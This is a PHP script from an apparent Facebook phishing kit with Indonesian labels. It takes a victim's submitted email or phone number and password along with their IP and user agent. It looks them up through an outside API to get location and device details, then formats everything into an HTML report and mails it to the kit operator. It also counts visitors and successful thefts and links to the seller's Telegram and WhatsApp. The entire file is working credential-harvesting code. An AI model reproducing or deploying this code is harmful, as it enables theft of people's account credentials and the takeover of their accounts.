<?php
date_default_timezone_set("Asia/Jakarta");
// INFO DEVICE
function devicemanager($ua){
    $ch = curl_init();  
    curl_setopt($ch, CURLOPT_URL, "https://api.dnsofc.my.id/system/useragent/?ua=".urlencode($ua)); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
    $exe = curl_exec($ch); 
    curl_close($ch);      

    return json_decode($exe,true);
}
// INFO BENDERA & DAERAH
function location($var){
    $ch = curl_init();  
    curl_setopt($ch, CURLOPT_URL, "https://api.dnsofc.my.id/system/flag/?ip=".$var); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
    $exe = curl_exec($ch); 
    curl_close($ch);      

    return json_decode($exe,true);
}

$user = $_POST['user'];
$pass = $_POST['pass'];
$ip = $_POST['ip'];
$ua = $_POST['ua'];
$time = date('d-m-Y : h-i-s');

$info = location($ip);
$dev = devicemanager($ua);

$subjek = $info['flag'].' '.$info['code'].' | FACEBOOK PUNYA '.$user;
$pesan = '
<center>
 <div style="background: url(https://i.ibb.co/XLMxHKJ/result-gege.png) no-repeat;border:2px solid pink;background-size: 100% 100%; width: 294; height: 101px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid pink; border-collapse:collapse;width:100%;background:#cf0485;">
    <tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Telepon</b></th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$user.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Kata sandi</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$pass.'</th> 
</tr>

</table>
<div style="border:2px solid pink;width: 294; font-weight:bold; height: 20px; background: #cf0485; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">
INFORMASI DAERAH
</div>
<table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid pink; border-collapse:collapse;width:100%;background:#cf0485;">
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>IP Address</th>
<th style="width: 65%; text-align: center;"><b>'.$ip.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Negara</th>
<th style="width: 65%; text-align: center;"><b>'.$info['country'].'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Bendera</th>
<th style="width: 65%; text-align: center;"><b>'.$info['flag'].'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Wilayah</th>
<th style="width: 65%; text-align: center;"><b>'.$info['region'].'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Kota</th>
<th style="width: 65%; text-align: center;"><b>'.$info['city'].'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Zip</th>
<th style="width: 65%; text-align: center;"><b>'.$info['zip'].'</th> 
</tr>
</table>
<div style="border:2px solid pink;width: 294; font-weight:bold; height: 20px; background: #cf0485; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">
INFORMASI PERANGKAT
</div>
<table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid pink; border-collapse:collapse;width:100%;background:#cf0485;">
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Perangkat</th>
<th style="width: 65%; text-align: center;"><b>'.$dev['device'].'</th> 
</tr>
<tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Browser</th>
<th style="width: 65%; text-align: center;"><b>'.$dev['browser'].'</th> 
</tr>
<tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Os</th>
<th style="width: 65%; text-align: center;"><b>'.$dev['os'].'</th> 
</tr>
<tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Tanggal/Waktu</th>
<th style="width: 65%; text-align: center;"><b>'.$time.'</th> 
</tr>
<tr>
</table>
<div style="border:2px solid pink;width: 294; font-weight:bold; height: 20px; background: #cf0485; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#0088CC;" href="https://t.me/dnscriptV1">Telegram</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#25D366;" href="https://wa.me/6282183925354">Whatsapp</a>
</div>
 <center>
';

// TODAY
$Tget = file_get_contents("data/visitor.json");
$Tdecode = json_decode($Tget,true);
$today = $Tdecode['today'] + 1;
$Tdecode['today'] = $today;
$Tresult = json_encode($Tdecode);
            $Tfile = fopen('data/visitor.json','w');
                     fwrite($Tfile,$Tresult);
                     fclose($Tfile);
                     
// YESTERDAY
if(date("H:i") == "01:00"){
$Yget = file_get_contents("data/visitor.json");
$Ydecode = json_decode($Yget,true);
$Ydecode['yesterday'] = $Ydecode['today'];
$Ydecode['today'] = 0;
$Yresult = json_encode($Ydecode);
            $Yfile = fopen('data/visitor.json','w');
                     fwrite($Yfile,$Yresult);
                     fclose($Yfile);
}

// ALL OVER
$Aget = file_get_contents("data/visitor.json");
$Adecode = json_decode($Aget,true);
$all = $Adecode['total'] + 1;
$Adecode['total'] = $all;
$Aresult = json_encode($Adecode);
            $Afile = fopen('data/visitor.json','w');
                     fwrite($Afile,$Aresult);
                     fclose($Afile);

// RESULT DATA
$resultGet = file_get_contents("data/data.json");
$resultData = json_decode($resultGet,true);

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: '.$resultData['nama'].' <ditznesia2@outlook.com' . "\r\n";

if(mail($resultData['email'], $subjek, $pesan, $headers))
{
$upGet = file_get_contents("data/data.json");
$upData = json_decode($upGet,true);
$hasil = $upData['totals'] + 1;
$upData['totals'] = $hasil;
$upResult = json_encode($upData);
$upFile = fopen('data/data.json','w');
          fwrite($upFile,$upResult);
          fclose($upFile);
}

